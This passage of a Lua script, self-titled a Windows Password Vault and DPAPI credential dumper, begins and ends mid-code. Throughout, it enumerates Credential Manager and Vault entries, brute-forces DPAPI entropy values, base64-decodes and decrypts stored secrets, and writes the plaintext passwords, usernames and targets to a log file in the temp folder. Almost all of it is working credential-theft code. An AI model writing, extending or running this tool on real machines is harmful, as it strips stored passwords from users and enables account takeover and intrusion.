                    label, attempt_count))
                print(string.format("  Entropy: '%s'", entropy_info.value))
                print(string.format("  Source:  %s", entropy_info.source))
                print(string.format("  Result:  %s", decrypted:sub(1, 100) .. (#decrypted > 100 and "..." or "")))
                
                log(string.format("[+] Successfully decrypted '%s' using previously successful entropy from %s", 
                    label, entropy_info.source))
                log(string.format("    Entropy value: %s", entropy_info.value))
                log(string.format("    Decrypted data: %s", decrypted))
                
                return decrypted, descr
            end
        end
        
        log(string.format("[*] Previously successful entropy values didn't work, continuing brute-force..."))
    end
    
    -- Continue with full brute-force using iterator
    for entropy_entry in iterate_entropy_values() do
        attempt_count = attempt_count + 1
        
        -- Show progress every 1000 attempts OR every 5 seconds (whichever comes first)
        local current_time = os.time()
        if attempt_count % 1000 == 0 or (current_time - last_progress_time) >= 5 then
            print(string.format("[*] Brute-forcing '%s': %d attempts...", label, attempt_count))
            last_progress_time = current_time
        end
        
        local decrypted, descr = dpapi_decrypt_with_entropy(
            encrypted_data, 
            data_size, 
            entropy_entry.value,
            entropy_entry.source,
            label  -- Pass label for logging
        )
        
        if decrypted then
            local entropy_display = entropy_entry.original or entropy_entry.value
            local full_entropy = entropy_entry.value
            
            -- Display full entropy value on screen (not truncated)
            print(string.format("\n[SUCCESS] Decrypted '%s' after %d attempts", label, attempt_count))
            print(string.format("  Entropy: '%s'", full_entropy))
            print(string.format("  Source:  %s", entropy_entry.source))
            print(string.format("  Result:  %s", decrypted:sub(1, 100) .. (#decrypted > 100 and "..." or "")))
            
            -- Also log to file
            if #entropy_display > 50 then
                entropy_display = entropy_display:sub(1, 50) .. "..."
            end
            
            log(string.format("[+] Successfully decrypted '%s' using entropy from %s: '%s'", 
                label, entropy_entry.source, entropy_display))
            log(string.format("    Full entropy value: %s", full_entropy))
            log(string.format("    Decrypted data: %s", decrypted))
            
            -- Track successful entropy
            local key = entropy_entry.source .. ":" .. entropy_entry.value
            if not SUCCESSFUL_ENTROPY_VALUES[key] then
                SUCCESSFUL_ENTROPY_VALUES[key] = {
                    value = entropy_entry.value,
                    source = entropy_entry.source,
                    count = 0
                }
            end
            SUCCESSFUL_ENTROPY_VALUES[key].count = SUCCESSFUL_ENTROPY_VALUES[key].count + 1
            
            -- STOP on first successful decryption and return
            return decrypted, descr
        end
    end
    
    -- All entropy values failed
    log(string.format("[!] All %d entropy attempts failed for '%s'", attempt_count, label))
    print(string.format("[!] Failed to decrypt '%s' after %d attempts", label, attempt_count))
    
    -- Fallback to no entropy if enabled
    if CONFIG.FALLBACK_NO_ENTROPY then
        debug_log(string.format("Trying decryption without entropy for '%s'", label))
        
        local data_in = ffi.new("DATA_BLOB")
        data_in.cbData = data_size
        data_in.pbData = encrypted_data
        
        local data_out = ffi.new("DATA_BLOB")
        local descr = ffi.new("LPWSTR[1]")
        descr[0] = nil
        
        local result = crypt32.CryptUnprotectData(
            data_in,
            descr,
            nil,  -- No entropy
            nil,
            nil,
            CRYPTPROTECT_UI_FORBIDDEN,
            data_out
        )
        
        if result ~= 0 then
            local decrypted = ffi.string(data_out.pbData, data_out.cbData)
            local description = nil
            if descr[0] ~= nil and descr[0] ~= ffi.NULL then
                description = wstring_to_string(descr[0])
                kernel32.LocalFree(descr[0])
            end
            kernel32.LocalFree(data_out.pbData)
            
            log(string.format("[+] Successfully decrypted '%s' WITHOUT entropy", label))
            return decrypted, description
        end
    end
    
    return nil, nil
end
-- Vault data unlock with entropy
local function vault_unlock_data(encrypted_bytes, byte_count, label, should_attack)
    label = label or "vault_data"
    
    -- If should_attack is false, skip unlock attempt
    if should_attack == false then
        debug_log(string.format("Skipping unlock attack for '%s' (not targeted)", label))
        return nil, nil
    end
    
    debug_log(string.format("Attempting to unlock vault data '%s' (%d bytes)", label, byte_count))
    
    -- First try DPAPI decryption with entropy
    local decrypted, descr = dpapi_decrypt(encrypted_bytes, byte_count, label)
    
    if decrypted then
        debug_log(string.format("Vault data unlocked successfully (%d bytes)", #decrypted))
        
        -- If decrypted data is base64, try to decode it
        if CONFIG.DECODE_BASE64 and is_base64(decrypted) then
            debug_log("Decrypted data appears to be base64, attempting decode...")
            local base64_decoded = decode_base64(decrypted)
            
            if base64_decoded then
                debug_log(string.format("Base64 decoded successfully (%d bytes)", #base64_decoded))
                
                -- Try to decrypt the base64-decoded data again with DPAPI+entropy
                local final_decrypted, final_descr = dpapi_decrypt(
                    ffi.cast("uint8_t*", base64_decoded), 
                    #base64_decoded, 
                    label .. "_base64_decoded"
                )
                
                if final_decrypted then
                    log(string.format("[+] Double-decrypted vault data (base64 -> DPAPI): '%s'", label))
                    return final_decrypted, final_descr or descr
                else
                    -- Return the base64-decoded data as-is
                    return base64_decoded, descr
                end
            end
        end
        
        return decrypted, descr
    end
    
    debug_log("Failed to unlock vault data")
    return nil, nil
end

-- Credential type to string
local function get_cred_type_string(cred_type)
    local types = {
        [CRED_TYPE_GENERIC] = "GENERIC",
        [CRED_TYPE_DOMAIN_PASSWORD] = "DOMAIN_PASSWORD",
        [CRED_TYPE_DOMAIN_CERTIFICATE] = "DOMAIN_CERTIFICATE",
        [CRED_TYPE_DOMAIN_VISIBLE_PASSWORD] = "DOMAIN_VISIBLE_PASSWORD",
        [CRED_TYPE_GENERIC_CERTIFICATE] = "GENERIC_CERTIFICATE",
        [CRED_TYPE_DOMAIN_EXTENDED] = "DOMAIN_EXTENDED",
    }
    return types[cred_type] or string.format("UNKNOWN (0x%X)", cred_type)
end

-- Persistence type to string
local function get_persist_string(persist)
    local persist_types = {
        [CRED_PERSIST_SESSION] = "SESSION",
        [CRED_PERSIST_LOCAL_MACHINE] = "LOCAL_MACHINE",
        [CRED_PERSIST_ENTERPRISE] = "ENTERPRISE",
    }
    return persist_types[persist] or string.format("UNKNOWN (0x%X)", persist)
end

-- FILETIME to string
local function filetime_to_string(ft)
    local low = tonumber(ft.dwLowDateTime)
    local high = tonumber(ft.dwHighDateTime)
    
    local filetime = bit.bor(bit.lshift(high, 32), low)
    local unix_epoch = 116444736000000000ULL
    local timestamp = (filetime - tonumber(unix_epoch)) / 10000000
    
    return os.date("%Y-%m-%d %H:%M:%S", timestamp)
end

-- GUID to string
local function guid_to_string(guid)
    return string.format("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
        guid.Data1, guid.Data2, guid.Data3,
        guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
        guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7])
end

-- Vault item data to string with unlock support
local function vault_data_to_string(item_data, resource_name, should_attack)
    local type_id = item_data.dwType
    
    if type_id == 0 then
        return "(null)", nil
    elseif type_id == 1 then
        return "false", nil
    elseif type_id == 2 then
        return "true", nil
    elseif type_id == 3 then
        return tostring(item_data.dword_data), nil
    elseif type_id == 4 then
        return guid_to_string(item_data.guid_data), nil
    elseif type_id == 5 then  -- String
        local str = wstring_to_string(item_data.string_data.string)
        return str or "(empty)", nil
    elseif type_id == 6 then  -- Byte array - try to unlock with entropy
        local byte_count = item_data.byte_array.length
        local bytes = item_data.byte_array.data
        
        debug_log(string.format("Vault byte array: %d bytes", byte_count))
        
        -- Try to unlock with entropy (only if should_attack is true)
        local unlocked, descr = vault_unlock_data(bytes, byte_count, resource_name or "vault_byte_array", should_attack)
        
        if unlocked then
            if is_printable(ffi.cast("uint8_t*", unlocked), #unlocked) then
                return unlocked, descr
            else
                return string.format("(binary data, %d bytes)\n%s", #unlocked, hexdump(ffi.cast("uint8_t*", unlocked), #unlocked)), descr
            end
        else
            -- Failed to unlock or skipped, show hex
            return string.format("(encrypted, %d bytes)\n%s", byte_count, hexdump(bytes, math.min(byte_count, 64))), nil
        end
    elseif type_id == 7 then  -- Protected string - try to unlock
        local wstr = item_data.protected_string.string
        
        if wstr ~= nil and wstr ~= ffi.NULL then
            -- Get the wide string
            local str = wstring_to_string(wstr)
            
            if str then
                debug_log(string.format("Protected string: length=%d", #str))
                
                -- Try to unlock it (only if should_attack is true)
                local unlocked, descr = vault_unlock_data(ffi.cast("uint8_t*", str), #str, resource_name or "protected_string", should_attack)
                
                if unlocked then
                    return unlocked, descr
                else
                    return str, nil  -- Return as-is if unlock fails or skipped
                end
            end
        end
        
        return "(empty protected string)", nil
    elseif type_id == 8 then  -- SID
        if item_data.sid ~= nil and item_data.sid ~= ffi.NULL then
            local sid_string = ffi.new("LPWSTR[1]")
            if advapi32.ConvertSidToStringSidW(item_data.sid, sid_string) ~= 0 then
                local result = wstring_to_string(sid_string[0])
                kernel32.LocalFree(sid_string[0])
                return result or "(invalid SID)", nil
            end
        end
        return "(null SID)", nil
    else
        return string.format("(unknown type %d)", type_id), nil
    end
end

-- Enumerate Windows Password Vaults with unlock support
local function enumerate_vaults()
    local vaults = {}
    local vault_count = ffi.new("DWORD[1]")
    local vault_guids = ffi.new("void**[1]")
    
    log("\n[*] Enumerating Windows Password Vaults...")
    
    local result = vaultcli.VaultEnumerateVaults(0, vault_count, vault_guids)
    
    if result ~= 0 then
        log(string.format("[!] VaultEnumerateVaults failed with error: 0x%X", result))
        return vaults
    end
    
    log(string.format("[+] Found %d vaults", vault_count[0]))
    
    if vault_count[0] == 0 or vault_guids[0] == nil then
        return vaults
    end
    
    for i = 0, vault_count[0] - 1 do
        local success, err = pcall(function()
            -- Cast vault_guids[0] to GUID* first, then use pointer arithmetic
            local guids_ptr = ffi.cast("GUID*", vault_guids[0])
            local vault_guid = guids_ptr + i  -- Pointer arithmetic to get i-th GUID
            
            local guid_str = guid_to_string(vault_guid[0])  -- Dereference pointer to get GUID value
            
            log(string.format("\n[*] Processing vault: %s", guid_str))
            
            local vault_handle = ffi.new("void*[1]")
            result = vaultcli.VaultOpenVault(vault_guid, 0, vault_handle)
            
            if result ~= 0 then
                log(string.format("[!] Failed to open vault: 0x%X", result))
                return  -- Return from pcall function
            end
            
            local item_count = ffi.new("DWORD[1]")
            local items = ffi.new("void*[1]")
            
            result = vaultcli.VaultEnumerateItems(vault_handle[0], 0x0200, item_count, items)
            
            if result ~= 0 then
                log(string.format("[!] Failed to enumerate vault items: 0x%X", result))
                vaultcli.VaultCloseVault(vault_handle[0])
                return  -- Return from pcall function
            end
            
            log(string.format("[+] Found %d items in vault", item_count[0]))
            
            local vault_info = {
                guid = guid_str,
                items = {}
            }
        
        -- Process each vault item using VaultGetItem
        if item_count[0] > 0 and items[0] ~= nil and items[0] ~= ffi.NULL then
            for j = 0, item_count[0] - 1 do
                local success, err = pcall(function()
                    -- Use pointer arithmetic to get each enumerated item
                    local item_ptr = ffi.cast("char*", items[0]) + (j * ffi.sizeof("VAULT_ITEM_8"))
                    local enum_item = ffi.cast("VAULT_ITEM_8*", item_ptr)
                    
                    local item_data = {}
                    
                    log(string.format("[DEBUG] Processing vault item %d", j))
                    
                    -- Get schema ID (safe, it's metadata)
                    local schema_guid = nil
                    local schema_success, schema_err = pcall(function()
                        log("[DEBUG] Reading schema_guid...")
                        schema_guid = enum_item.schemaId  -- Keep as GUID struct, don't convert to string yet
                        log("[DEBUG] Converting schema to string...")
                        item_data.schema_id = guid_to_string(schema_guid)  -- Convert to string for display only
                        log(string.format("[DEBUG] Schema ID: %s", item_data.schema_id))
                    end)
                    
                    if not schema_success then
                        log(string.format("[!] Failed to read schema: %s", tostring(schema_err)))
                        return
                    end
                    
                    -- Get friendly name (safe, it's metadata)
                    pcall(function()
                        if enum_item.friendlyName ~= nil and enum_item.friendlyName ~= ffi.NULL then
                            item_data.friendly_name = wstring_to_string(enum_item.friendlyName)
                        end
                    end)
                    
                    -- Get resource and identity POINTERS (do NOT dereference yet!)
                    local resource_ptr = enum_item.pResourceElement
                    local identity_ptr = enum_item.pIdentityElement
                    
                    -- Use VaultGetItem to get decrypted item with VALID pointers
                    local decrypted_item = ffi.new("void*[1]")
                    local get_result = vaultcli.VaultGetItem(
                        vault_handle[0],
                        schema_guid,
                        resource_ptr,          -- Pass pointer, don't dereference
                        identity_ptr,          -- Pass pointer, don't dereference
                        nil,
                        ffi.NULL,
                        0,
                        decrypted_item
                    )
                    
                    if get_result == 0 and decrypted_item[0] ~= nil and decrypted_item[0] ~= ffi.NULL then
                        local decrypted = ffi.cast("VAULT_ITEM_8*", decrypted_item[0])
                        
                        -- NOW we can safely dereference the decrypted item's pointers
                        
                        -- Extract Resource
                        pcall(function()
                            if decrypted.pResourceElement ~= nil and decrypted.pResourceElement ~= ffi.NULL then
                                local res_type = decrypted.pResourceElement.data.dwType
                                if res_type == 5 then
                                    item_data.resource = wstring_to_string(decrypted.pResourceElement.data.string_data.string)
                                elseif res_type == 7 then
                                    item_data.resource = wstring_to_string(decrypted.pResourceElement.data.protected_string.string)
                                end
                            end
                        end)
                        
                        -- Extract Identity
                        pcall(function()
                            if decrypted.pIdentityElement ~= nil and decrypted.pIdentityElement ~= ffi.NULL then
                                local id_type = decrypted.pIdentityElement.data.dwType
                                if id_type == 5 then
                                    item_data.identity = wstring_to_string(decrypted.pIdentityElement.data.string_data.string)
                                elseif id_type == 7 then
                                    item_data.identity = wstring_to_string(decrypted.pIdentityElement.data.protected_string.string)
                                end
                            end
                        end)
                        
                        -- Extract Authenticator (Password) - Type 7 = already decrypted by VaultGetItem, but contains BASE64-encoded DPAPI blob!
                        pcall(function()
                            if decrypted.pAuthenticatorElement ~= nil and decrypted.pAuthenticatorElement ~= ffi.NULL then
                                local auth_type = decrypted.pAuthenticatorElement.data.dwType
                                
                                if auth_type == 7 then  -- Protected string (already "decrypted" by Vault API)
                                    local password_str = wstring_to_string(decrypted.pAuthenticatorElement.data.protected_string.string)
                                    
                                    if password_str then
                                        -- Check if this resource should be targeted for unlock attack (exact match)
                                        local should_attack = (CONFIG.TARGET_RESOURCE == nil) or 
                                                              (item_data.resource and item_data.resource == CONFIG.TARGET_RESOURCE)
                                        
                                        if should_attack then
                                            ATTACK_STATS.resources_targeted = ATTACK_STATS.resources_targeted + 1
                                        end
                                        
                                        -- Store password regardless (for later processing)
                                        item_data.password_encrypted = password_str
                                        item_data.should_attack = should_attack
                                        
                                        -- Just store the password for now - we'll attack ALL matching items together later
                                        item_data.authenticator = password_str
                                        item_data.decrypted = false
                                    end
                                end
                            end
                        end)
                        
                        -- Free the decrypted item
                        if decrypted_item[0] ~= nil and decrypted_item[0] ~= ffi.NULL then
                            vaultcli.VaultFree(decrypted_item[0])
                        end
                    end
                    
                    table.insert(vault_info.items, item_data)
                end)
                
                if not success then
                    log(string.format("[!] Error processing vault item #%d: %s", j, tostring(err)))
                end
            end
        end
            
            table.insert(vaults, vault_info)
            
            if items[0] ~= nil and items[0] ~= ffi.NULL then
                vaultcli.VaultFree(items[0])
            end
            
            vaultcli.VaultCloseVault(vault_handle[0])
        end)
        
        if not success then
            log(string.format("[!] Error processing vault: %s", tostring(err)))
        end
    end
    
    if vault_guids[0] ~= nil and vault_guids[0] ~= ffi.NULL then
        vaultcli.VaultFree(vault_guids[0])
    end
    
    -- Post-process: Attack all matching vault items with base64+DPAPI
    log("\n[*] Post-processing: Attacking all matching vault items...")
    for _, vault_info in ipairs(vaults) do
        for _, item in ipairs(vault_info.items) do
            if item.should_attack and item.password_encrypted and not item.decrypted then
                local label = string.format("%s/%s", item.resource or "unknown", item.identity or "unknown")
                log(string.format("\n[*] Attacking vault item: '%s'", label))
                
                -- The password is a BASE64-encoded DPAPI blob!
                if CONFIG.DECODE_PASSWORD_BASE64 and is_base64(item.password_encrypted) then
                    log(string.format("[*] Password appears to be base64-encoded (%d chars)", #item.password_encrypted))
                    
                    local base64_decoded = decode_base64(item.password_encrypted)
                    
                    if base64_decoded then
                        log(string.format("[*] Base64 decoded successfully (%d bytes), attempting DPAPI unlock with entropy...", #base64_decoded))
                        
                        ATTACK_STATS.resources_attacked = ATTACK_STATS.resources_attacked + 1
                        
                        -- Try to unlock the base64-decoded data with DPAPI+entropy
                        local decrypted_password, descr = dpapi_decrypt(
                            ffi.cast("uint8_t*", base64_decoded),
                            #base64_decoded,
                            label
                        )
                        
                        if decrypted_password then
                            item.authenticator = decrypted_password
                            item.authenticator_base64 = item.password_encrypted
                            item.decrypted = true
                            item.attack_method = "vault_base64_decode_then_dpapi_unlock"
                            log(string.format("[+] Successfully decrypted vault password for '%s'!", label))
                        else
                            log(string.format("[!] DPAPI unlock failed for '%s'", label))
                        end
                    else
                        log(string.format("[!] Base64 decode failed for '%s'", label))
                    end
                end
            end
        end
    end
    
    return vaults
end

-- Credential Manager Enumeration with unlock support
local function enumerate_credentials()
    local credentials = {}
    local count = ffi.new("DWORD[1]")
    local creds = ffi.new("PCREDENTIALW*[1]")
    
    log("\n[*] Enumerating Windows Credential Manager...")
    
    local result = advapi32.CredEnumerateW(nil, 0, count, creds)
    
    if result == 0 then
        local err = kernel32.GetLastError()
        log(string.format("[!] CredEnumerateW failed with error: 0x%X", err))
        return credentials
    end
    
    log(string.format("[+] Found %d credentials", count[0]))
    
    for i = 0, count[0] - 1 do
        local cred = creds[0][i]
        local cred_info = {}
        
        cred_info.target = wstring_to_string(cred.TargetName)
        cred_info.username = wstring_to_string(cred.UserName)
        cred_info.comment = wstring_to_string(cred.Comment)
        cred_info.type = get_cred_type_string(cred.Type)
        cred_info.type_id = cred.Type
        cred_info.persist = get_persist_string(cred.Persist)
        cred_info.last_written = filetime_to_string(cred.LastWritten)
        
        if cred.CredentialBlobSize > 0 and cred.CredentialBlob ~= nil then
            local blob_size = cred.CredentialBlobSize
            
            -- Check if this resource should be targeted for unlock attack (exact match)
            local should_attack = (CONFIG.TARGET_RESOURCE == nil) or 
                                  (cred_info.target and cred_info.target == CONFIG.TARGET_RESOURCE)
            
            if should_attack then
                ATTACK_STATS.resources_targeted = ATTACK_STATS.resources_targeted + 1
            end
            
            if not should_attack then
                -- No unlock attack - just try to read as plain text
                local plain = ffi.string(cred.CredentialBlob, blob_size)
                
                if is_printable(cred.CredentialBlob, blob_size) then
                    cred_info.password = plain:gsub("%z", "")
                    cred_info.decrypted = false
                else
                    cred_info.password_hexdump = hexdump(cred.CredentialBlob, blob_size)
                    cred_info.decrypted = false
                end
            else
                -- Perform unlock attack on this resource
                log(string.format("\n[*] Targeting resource for unlock attack: '%s'", cred_info.target or "credential"))
                
                -- Strategy 1: If DECODE_PASSWORD_BASE64 is enabled, try base64 decode FIRST, then DPAPI unlock
                if CONFIG.DECODE_PASSWORD_BASE64 then
                    local plain = ffi.string(cred.CredentialBlob, blob_size)
                    
                    if is_printable(cred.CredentialBlob, blob_size) then
                        local password_candidate = plain:gsub("%z", "")
                        
                        -- Check if it's base64
                        if is_base64(password_candidate) then
                            log(string.format("[*] Password field appears to be base64-encoded (%d bytes)", #password_candidate))
                            
                            local base64_decoded = decode_base64(password_candidate)
                            
                            if base64_decoded then
                                log(string.format("[*] Base64 decoded successfully (%d bytes), attempting DPAPI unlock with entropy...", #base64_decoded))
                                
                                ATTACK_STATS.resources_attacked = ATTACK_STATS.resources_attacked + 1
                                
                                -- Try to unlock the base64-decoded data with DPAPI+entropy
                                local decrypted, descr = dpapi_decrypt(
                                    ffi.cast("uint8_t*", base64_decoded),
                                    #base64_decoded,
                                    cred_info.target or "credential"
                                )
                                
                                if decrypted then
                                    cred_info.password = decrypted
                                    cred_info.password_base64_original = password_candidate
                                    cred_info.decrypted = true
                                    cred_info.dpapi_description = descr
                                    cred_info.attack_method = "base64_decode_then_dpapi_unlock"
                                else
                                    -- Base64 decoded but DPAPI unlock failed
                                    cred_info.password = password_candidate
                                    cred_info.password_base64_decoded = base64_decoded
                                    cred_info.decrypted = false
                                    cred_info.attack_method = "base64_decode_only"
                                end
                            else
                                cred_info.password = password_candidate
                                cred_info.decrypted = false
                            end
                        else
                            -- Not base64, try direct DPAPI unlock
                            local decrypted, descr = dpapi_decrypt(cred.CredentialBlob, blob_size, cred_info.target or "credential")
                            
                            if decrypted then
                                cred_info.password = decrypted
                                cred_info.decrypted = true
                                cred_info.dpapi_description = descr
                                cred_info.attack_method = "dpapi_unlock_only"
                            else
                                cred_info.password = password_candidate
                                cred_info.decrypted = false
                            end
                        end
                    else
                        -- Not printable - try direct DPAPI unlock on raw bytes
                        ATTACK_STATS.resources_attacked = ATTACK_STATS.resources_attacked + 1
                        local decrypted, descr = dpapi_decrypt(cred.CredentialBlob, blob_size, cred_info.target or "credential")
                        
                        if decrypted then
                            cred_info.password = decrypted
                            cred_info.decrypted = true
                            cred_info.dpapi_description = descr
                            cred_info.attack_method = "dpapi_unlock_binary"
                        else
                            cred_info.password_hexdump = hexdump(cred.CredentialBlob, blob_size)
                            cred_info.decrypted = false
                        end
                    end
                else
                    -- DECODE_PASSWORD_BASE64 is false - try direct DPAPI unlock first
                    ATTACK_STATS.resources_attacked = ATTACK_STATS.resources_attacked + 1
                    local decrypted, descr = dpapi_decrypt(cred.CredentialBlob, blob_size, cred_info.target or "credential")
                    
                    if decrypted then
                        cred_info.password = decrypted
                        cred_info.decrypted = true
                        cred_info.dpapi_description = descr
                        cred_info.attack_method = "dpapi_unlock_only"
                        
                        -- Check if decrypted data is base64 (fallback)
                        if CONFIG.DECODE_BASE64 and is_base64(decrypted) then
                            local decoded = decode_base64(decrypted)
                            if decoded and is_printable(ffi.cast("uint8_t*", decoded), #decoded) then
                                cred_info.password_base64_decoded = decoded
                                
                                -- Try DPAPI again on base64-decoded data
                                local double_decrypt, double_descr = dpapi_decrypt(
                                    ffi.cast("uint8_t*", decoded),
                                    #decoded,
                                    cred_info.target .. "_base64"
                                )
                                
                                if double_decrypt then
                                    cred_info.password_double_decrypted = double_decrypt
                                    cred_info.password = double_decrypt  -- Use this as primary
                                    cred_info.attack_method = "dpapi_unlock_then_base64_then_dpapi"
                                end
                            end
                        end
                    else
                        -- Try to read as plain text
                        local plain = ffi.string(cred.CredentialBlob, blob_size)
                        
                        if is_printable(cred.CredentialBlob, blob_size) then
                            cred_info.password = plain:gsub("%z", "")
                            cred_info.decrypted = false
                            
                            -- Check if plaintext is base64
                            if CONFIG.DECODE_BASE64 and is_base64(cred_info.password) then
                                local decoded = decode_base64(cred_info.password)
                                if decoded and is_printable(ffi.cast("uint8_t*", decoded), #decoded) then
                                    cred_info.password_base64_decoded = decoded
                                end
                            end
                        else
                            cred_info.password_hexdump = hexdump(cred.CredentialBlob, blob_size)
                            cred_info.decrypted = false
                        end
                    end
                end
            end
            
            cred_info.blob_size = blob_size
        end
        
        table.insert(credentials, cred_info)
    end
    
    advapi32.CredFree(creds[0])
    
    return credentials
end

-- Display results
local function display_credentials(credentials)
    log("\n" .. string.rep("=", 80))
    log("CREDENTIAL MANAGER DUMP")
    log(string.rep("=", 80))
    
    for i, cred in ipairs(credentials) do
        log(string.format("\n[Credential #%d]", i))
        log(string.format("  Target:       %s", cred.target or "(none)"))
        log(string.format("  Username:     %s", cred.username or "(none)"))
        log(string.format("  Type:         %s", cred.type))
        log(string.format("  Persist:      %s", cred.persist))
        log(string.format("  Last Written: %s", cred.last_written))
        
        if cred.comment then
            log(string.format("  Comment:      %s", cred.comment))
        end
        
        if cred.password then
            log(string.format("  Password:     %s", cred.password))
            log(string.format("  Decrypted:    %s", tostring(cred.decrypted)))
            
            if cred.attack_method then
                log(string.format("  Attack:       %s", cred.attack_method))
            end
            
            if cred.dpapi_description then
                log(string.format("  DPAPI Descr:  %s", cred.dpapi_description))
            end
            
            if cred.password_base64_original then
                log(string.format("  Base64 Orig:  %s", cred.password_base64_original:sub(1, 100) .. (#cred.password_base64_original > 100 and "..." or "")))
            end
            
            if cred.password_base64_decoded then
                log(string.format("  Base64 Dec:   %s", cred.password_base64_decoded))
            end
            
            if cred.password_double_decrypted then
                log(string.format("  Double Dec:   %s", cred.password_double_decrypted))
            end
        elseif cred.password_hexdump then
            log("  Password (Hex):")
            for line in cred.password_hexdump:gmatch("[^\n]+") do
                log("    " .. line)
            end
        end
    end
    
    log("\n" .. string.rep("=", 80))
    log(string.format("Total Credentials: %d", #credentials))
    log(string.rep("=", 80))
end

local function display_vaults(vaults)
    log("\n" .. string.rep("=", 80))
    log("PASSWORD VAULT DUMP")
    log(string.rep("=", 80))
    
    for i, vault in ipairs(vaults) do
        log(string.format("\n[Vault #%d]", i))
        log(string.format("  GUID: %s", vault.guid))
        log(string.format("  Items: %d", #vault.items))
        
        for j, item in ipairs(vault.items) do
            log(string.format("\n  [Item #%d]", j))
            log(string.format("    Schema ID:     %s", item.schema_id))
            log(string.format("    Friendly Name: %s", item.friendly_name or "(none)"))
            log(string.format("    Last Written:  %s", item.last_written))
            
            if item.resource then
                log(string.format("    Resource:      %s", item.resource))
                if item.resource_descr then
                    log(string.format("    Resource Desc: %s", item.resource_descr))
                end
            end
            
            if item.identity then
                log(string.format("    Identity:      %s", item.identity))
                if item.identity_descr then
                    log(string.format("    Identity Desc: %s", item.identity_descr))
                end
            end
            
            if item.authenticator then
                log(string.format("    Password:      %s", item.authenticator))
                if item.authenticator_descr then
                    log(string.format("    Auth Desc:     %s", item.authenticator_descr))
                end
            end
        end
    end
    
    log("\n" .. string.rep("=", 80))
    log(string.format("Total Vaults: %d", #vaults))
    log(string.rep("=", 80))
end

-- Display successful entropy values
local function display_successful_entropy()
    local count = 0
    for _ in pairs(SUCCESSFUL_ENTROPY_VALUES) do
        count = count + 1
    end
    
    if count == 0 then
        log("\n[!] No successful entropy values found!")
        
        if ATTACK_STATS.resources_targeted == 0 then
            log("[!] Reason: No resources matched the TARGET_RESOURCE filter")
            if CONFIG.TARGET_RESOURCE then
                log(string.format("[!] You specified TARGET_RESOURCE = '%s' but no resources matched", CONFIG.TARGET_RESOURCE))
                log("[!] Try setting TARGET_RESOURCE = nil to attack all resources")
            else
                log("[!] No credentials or vault items found")
            end
        elseif ATTACK_STATS.resources_attacked == 0 then
            log("[!] Reason: Resources were found but could not be attacked")
            log(string.format("[!] Resources matched: %d, but none had base64-encoded passwords", ATTACK_STATS.resources_targeted))
        else
            log("[!] Possible reasons:")
            log("    - Data is not encrypted with DPAPI")
            log("    - Wrong entropy values in your list")
            log("    - Data was encrypted by different user/machine")
            log(string.format("[!] Resources matched: %d, Resources attacked: %d", 
                ATTACK_STATS.resources_targeted, ATTACK_STATS.resources_attacked))
        end
        return
    end
    
    log("\n" .. string.rep("=", 80))
    log("SUCCESSFUL ENTROPY VALUES")
    log(string.rep("=", 80))
    
    local sorted = {}
    for _, entry in pairs(SUCCESSFUL_ENTROPY_VALUES) do
        table.insert(sorted, entry)
    end
    
    table.sort(sorted, function(a, b) return a.count > b.count end)
    
    for i, entry in ipairs(sorted) do
        local display_value = entry.value
        if #display_value > 60 then
            display_value = display_value:sub(1, 60) .. "..."
        end
        
        log(string.format("\n[%d] Source: %s", i, entry.source))
        log(string.format("    Value:  '%s'", display_value))
        log(string.format("    Bytes:  %d", #entry.value))
        log(string.format("    Used:   %d time(s)", entry.count))
    end
    
    log("\n" .. string.rep("=", 80))
    log(string.format("Total Successful Entropy Values: %d", count))
    log(string.rep("=", 80))
end

-- Main Execution
local function main()
    print([[
================================================================================
    Windows Password Vault & DPAPI Credential Dumper with Entropy Support
    Extracts credentials using DPAPI with user-specified entropy
================================================================================
]])
    
    -- Initialize single consolidated log in %TEMP%
    if not init_logging() then
        print("[!] ERROR: Could not initialize logging")
        return
    end
    
    print(string.format("\n[*] Log file created: %s\n", LOG_PATH))
    
    -- Log configuration (to file only, not screen)
    log("\n[*] Configuration:")
    log(string.format("    Entropy List File: %s", CONFIG.ENTROPY_LIST_FILE or "(none)"))
    log(string.format("    Auto-try Common: %s", tostring(CONFIG.AUTO_TRY_COMMON)))
    log(string.format("    Fallback to No Entropy: %s", tostring(CONFIG.FALLBACK_NO_ENTROPY)))
    log(string.format("    Decode Password Base64: %s", tostring(CONFIG.DECODE_PASSWORD_BASE64)))
    log(string.format("    Target Resource: %s", CONFIG.TARGET_RESOURCE or "(all resources)"))
    log("")
    
    -- Log process context for DPAPI troubleshooting (to file only)
    log("[*] Process Context Information:")
    local pid = kernel32.GetCurrentProcessId()
    log(string.format("    Process ID: %d", pid))
    
    local proc_name = ffi.new("char[260]")
    local name_len = kernel32.GetModuleFileNameA(nil, proc_name, 260)
    if name_len > 0 then
        local full_path = ffi.string(proc_name)
        local name_only = full_path:match("([^\\]+)$") or full_path
        log(string.format("    Process Name: %s", name_only))
        log(string.format("    Process Path: %s", full_path))
    end
    
    local username = ffi.new("char[260]")
    local username_len = ffi.new("DWORD[1]", 260)
    if advapi32.GetUserNameA(username, username_len) ~= 0 then
        log(string.format("    Username: %s", ffi.string(username)))
    end
    
    local computer = ffi.new("char[260]")
    local comp_size = ffi.new("DWORD[1]", 260)
    if kernel32.GetComputerNameA(computer, comp_size) ~= 0 then
        log(string.format("    Computer: %s", ffi.string(computer)))
    end
    log("")
    
    -- Initialize entropy values
    init_entropy_values()
    
    if not ENTROPY_VALUES or (not ENTROPY_VALUES.__lazy_load and #COMMON_ENTROPY_VALUES == 0) then
        log("\n[!] ERROR: No entropy values loaded!")
        log("[!] This tool requires entropy values to decrypt DPAPI data")
        log("[!] Please check:")
        log("    - CONFIG.ENTROPY_LIST_FILE path is correct")
        log("    - File exists and is readable")
        log("    - File contains strings (one per line or ADDRESS: STRING format)")
        log(string.format("[!] Current path: %s", CONFIG.ENTROPY_LIST_FILE or "(not set)"))
        log("[!] Set CONFIG.AUTO_TRY_COMMON = true to try common values")
        close_logging()
        return
    end
    
    -- Print brief config to screen only
    print(string.format("[*] Entropy source: %s", CONFIG.ENTROPY_LIST_FILE or "(none)"))
    print(string.format("[*] Common entropy values: %d", #COMMON_ENTROPY_VALUES))
    print(string.format("[*] Target resource: %s\n", CONFIG.TARGET_RESOURCE or "(all resources)"))
    
    -- Enumerate credentials
    local credentials = enumerate_credentials()
    
    -- Enumerate vaults
    print("[*] Enumerating vaults...\n")
